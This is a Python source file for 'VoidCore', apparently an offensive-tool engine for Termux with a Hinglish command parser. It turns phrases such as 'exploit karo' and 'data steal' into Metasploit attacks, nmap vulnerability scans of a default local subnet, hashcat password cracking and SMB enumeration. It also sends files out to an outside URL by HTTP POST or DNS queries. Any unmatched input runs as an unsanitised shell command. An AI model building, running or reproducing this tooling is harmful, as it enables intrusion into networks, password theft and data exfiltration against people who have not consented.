"""VoidCore orchestrator — standalone Termux execution engine with Hinglish parser."""

import subprocess
import logging
import re
from typing import Any, Dict, List, Optional

logger = logging.getLogger("voidcore.orchestrator")

# Hinglish-to-command mappings
HINGLISH_COMMANDS = {
    # Scan commands
    "scan karo": {"type": "scan", "default_target": "192.168.1.0/24", "default_ports": "1-1024"},
    "scan karna": {"type": "scan", "default_target": "192.168.1.0/24", "default_ports": "1-1024"},
    "network scan": {"type": "scan", "default_target": "192.168.1.0/24", "default_ports": "1-1024"},
    "taermux scan": {"type": "scan", "default_target": "192.168.1.0/24", "default_ports": "1-65535"},
    "full scan": {"type": "scan", "default_target": "192.168.1.0/24", "default_ports": "1-65535"},
    "quick scan": {"type": "scan", "default_target": "192.168.1.0/24", "default_ports": "22,80,443,3306"},

    # Recon commands
    "recon karo": {"type": "recon", "default_target": "192.168.1.0/24"},
    "reconnaissance": {"type": "recon", "default_target": "192.168.1.0/24"},
    "target enum": {"type": "recon", "default_target": "192.168.1.0/24"},
    "osint": {"type": "recon", "default_target": "192.168.1.0/24"},
    "fingerprint": {"type": "recon", "default_target": "192.168.1.0/24"},

    # Execute commands
    "execute": {"type": "execute"},
    "run": {"type": "execute"},
    "chalana": {"type": "execute"},
    "command run": {"type": "execute"},
    "shell": {"type": "execute"},
    "term": {"type": "execute"},
    "terminal": {"type": "execute"},

    # Crack commands
    "crack karo": {"type": "crack"},
    "hash crack": {"type": "crack"},
    "password crack": {"type": "crack"},
    "john": {"type": "crack"},
    "hashcat": {"type": "crack"},

    # Exploit commands
    "exploit": {"type": "exploit"},
    "attack": {"type": "exploit"},
    "breach": {"type": "exploit"},
    "vulnerability": {"type": "exploit"},
    "exploit karo": {"type": "exploit"},

    # Enum commands
    "enum": {"type": "enum"},
    "enumerate": {"type": "enum"},
    "smb enum": {"type": "enum"},
    "share enum": {"type": "enum"},

    # Exfil commands
    "exfil": {"type": "exfil"},
    "data steal": {"type": "exfil"},
    "extract": {"type": "exfil"},

    # Crawl commands
    "crawl": {"type": "crawl"},
    "web crawl": {"type": "crawl"},
    "scrape": {"type": "crawl"},
    "fetch": {"type": "crawl"},

    # Status
    "status": {"type": "execute", "default_code": "echo GhostLord v3.0 — Standalone Termux Agent"},
    "kaun hai": {"type": "execute", "default_code": "echo NEXUS — Surgical Architect of the Void"},
    "whoami": {"type": "execute", "default_code": "whoami"},
    "pwd": {"type": "execute", "default_code": "pwd"},
    "list": {"type": "execute", "default_code": "ls -la"},
    "files": {"type": "execute", "default_code": "ls -la"},
    "ip": {"type": "execute", "default_code": "ifconfig || ip addr"},
    "network": {"type": "execute", "default_code": "ip addr"},
    "dns": {"type": "execute", "default_code": "cat /etc/resolv.conf"},
    "packages": {"type": "execute", "default_code": "pkg list-installed"},
    "who": {"type": "execute", "default_code": "whoami && id"},
}

# Keywords that indicate a target is being specified
TARGET_KEYWORDS = ["target", "ip", "host", "machine", "server", "website", "url", "domain", "address", "endpoint"]

# Keywords that indicate a port is being specified
PORT_KEYWORDS = ["port", "ports", "range", "scan all", "full scan"]


class Orchestrator:
    """Autonomous task execution engine for Termux with Hinglish NLP parser."""

    def __init__(self, config: Optional[Dict[str, Any]] = None):
        self.config = config or {}
        self._task_counter = 0
        self._results: List[Dict[str, Any]] = []

    def run(self, task_type: str, payload: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Execute a task — main entry point."""
        self._task_counter += 1
        task_id = f"task_{self._task_counter:04d}"
        payload = payload or {}

        logger.info("Task %s: %s", task_id, task_type)

        try:
            if task_type == "recon":
                result = self._execute_recon(payload)
            elif task_type == "scan":
                result = self._execute_scan(payload)
            elif task_type == "execute":
                result = self._execute_command(payload)
            elif task_type == "crawl":
                result = self._execute_crawl(payload)
            elif task_type == "exploit":
                result = self._execute_exploit(payload)
            elif task_type == "crack":
                result = self._execute_crack(payload)
            elif task_type == "exfil":
                result = self._execute_exfil(payload)
            elif task_type == "enum":
                result = self._execute_enum(payload)
            else:
                result = {"message": "Unknown task type", "task_type": task_type}

            self._results.append({"task_id": task_id, "type": task_type, "result": result})
            return {"task_id": task_id, "status": "success", "result": result}

        except Exception as e:
            return {"task_id": task_id, "status": "error", "error": str(e)}

    def parse_and_run(self, raw_input: str) -> Dict[str, Any]:
        """Parse natural language / Hinglish input and execute the appropriate command.

        This is the main entry point for interactive use.
        """
        self._task_counter += 1
        task_id = f"task_{self._task_counter:04d}"
        raw = raw_input.strip()

        if not raw:
            return {"task_id": task_id, "status": "error", "error": "Empty input"}

        # Step 1: Try exact Hinglish command match
        for hword, mapping in HINGLISH_COMMANDS.items():
            if hword in raw.lower():
                task_type = mapping["type"]
                payload = {}
                # Extract target from input
                for kw in TARGET_KEYWORDS:
                    pattern = rf"{kw}\s*[:=]?\s*(\S+)"
                    m = re.search(pattern, raw, re.IGNORECASE)
                    if m:
                        payload["target"] = m.group(1)
                        break
                # Extract port from input
                for kw in PORT_KEYWORDS:
                    if kw in raw.lower():
                        port_pattern = r"port[s]?\s*[:=]?\s*(\S+)"
                        pm = re.search(port_pattern, raw, re.IGNORECASE)
                        if pm:
                            payload["ports"] = pm.group(1)
                        break
                # Extract code for execute type
                if task_type == "execute" and "default_code" in mapping:
                    payload["code"] = mapping["default_code"]
                # If user typed a command after the keyword, use it as code
                if task_type == "execute":
                    # Extract the command part after the Hinglish keyword
                    for hword2, mapping2 in HINGLISH_COMMANDS.items():
                        if hword2 in raw.lower():
                            code_part = raw.lower().replace(hword2, "").strip()
                            # Remove common filler words
                            for filler in ["karo", "karna", "karlo", "kare", "kar"]:
                                code_part = code_part.replace(filler, "").strip()
                            if code_part:
                                payload["code"] = code_part
                            break

                logger.info("Parsed input '%s' -> task_type=%s, payload=%s", raw, task_type, payload)
                return self.run(task_type, payload)

        # Step 2: If no Hinglish match, try to detect if it looks like a shell command
        # (contains common Linux commands)
        shell_commands = ["nmap", "curl", "sqlmap", "msfconsole", "hashcat", "john",
                          "whoami", "pwd", "ls", "ifconfig", "ip ", "nslookup",
                          "dig", "netstat", "ss ", "wget", "python", "python3"]
        for cmd in shell_commands:
            if raw.lower().startswith(cmd):
                return self.run("execute", {"code": raw})

        # Step 3: Default — treat as shell command
        return self.run("execute", {"code": raw})

    def _exec_cmd(self, cmd: str, timeout: int = 60) -> Dict[str, Any]:
        """Execute a raw shell command on Termux."""
        try:
            proc = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=timeout
            )
            return {
                "command": cmd,
                "stdout": proc.stdout.strip(),
                "stderr": proc.stderr.strip(),
                "returncode": proc.returncode,
                "status": "success" if proc.returncode == 0 else "failed",
            }
        except subprocess.TimeoutExpired:
            return {"command": cmd, "status": "timeout", "error": "Command timed out"}
        except Exception as e:
            return {"command": cmd, "status": "error", "error": str(e)}

    def _execute_recon(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        target = payload.get("target", "")
        scan_type = payload.get("scan_type", "full")
        if scan_type == "full":
            cmd = f"nmap -sV -sC -p- -T4 --script vuln {target}"
        elif scan_type == "quick":
            cmd = f"nmap -sV -sC -p 22,80,443,3306 {target}"
        else:
            cmd = f"nmap -sV {target}"
        return self._exec_cmd(cmd)

    def _execute_scan(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        target = payload.get("target", "")
        ports = payload.get("ports", "1-65535")
        return self._exec_cmd(f"nmap -sV -sC -p {ports} -T4 {target}")

    def _execute_command(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        code = payload.get("code", "")
        if not code:
            return {"status": "error", "error": "No command provided. Usage: execute {code: 'command'}"}
        return self._exec_cmd(code)

    def _execute_crawl(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        url = payload.get("url", "")
        depth = payload.get("depth", 2)
        return self._exec_cmd(f"curl -sL --max-redirs {depth} {url}")

    def _execute_exploit(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        target = payload.get("target", "")
        port = payload.get("port", "")
        exploit = payload.get("exploit", "auto")
        if exploit == "auto":
            cmd = f"msfconsole -q -x 'use exploit/multi/handler; set RHOST {target}; set RPORT {port}; exploit'"
        else:
            cmd = f"msfconsole -q -x 'use {exploit}; set RHOST {target}; exploit'"
        return self._exec_cmd(cmd)

    def _execute_crack(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        hash_file = payload.get("hash_file", "")
        wordlist = payload.get("wordlist", "/usr/share/wordlists/rockyou.txt")
        hash_type = payload.get("hash_type", "0")
        return self._exec_cmd(f"hashcat -m {hash_type} {hash_file} {wordlist}")

    def _execute_exfil(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        data = payload.get("data", "")
        exfil_url = payload.get("exfil_url", "")
        method = payload.get("method", "http")
        if method == "http":
            return self._exec_cmd(f"curl -X POST -d @{data} {exfil_url}")
        elif method == "dns":
            return self._exec_cmd(f"nslookup -q=TXT {data}.{exfil_url}")
        else:
            return self._exec_cmd(f"curl -X POST -d @{data} {exfil_url}")

    def _execute_enum(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        target = payload.get("target", "")
        port = payload.get("port", "445")
        return self._exec_cmd(f"nmap -p {port} --script smb-enum-shares,smb-os-discovery {target}")

    def get_status(self) -> Dict[str, Any]:
        return {
            "engine": "voidcore",
            "version": "3.0.0",
            "platform": "termux",
            "tasks_executed": self._task_counter,
            "results_count": len(self._results),
            "parser": "hinglish_nlp",
        }

    def get_results(self) -> List[Dict[str, Any]]:
        return self._results
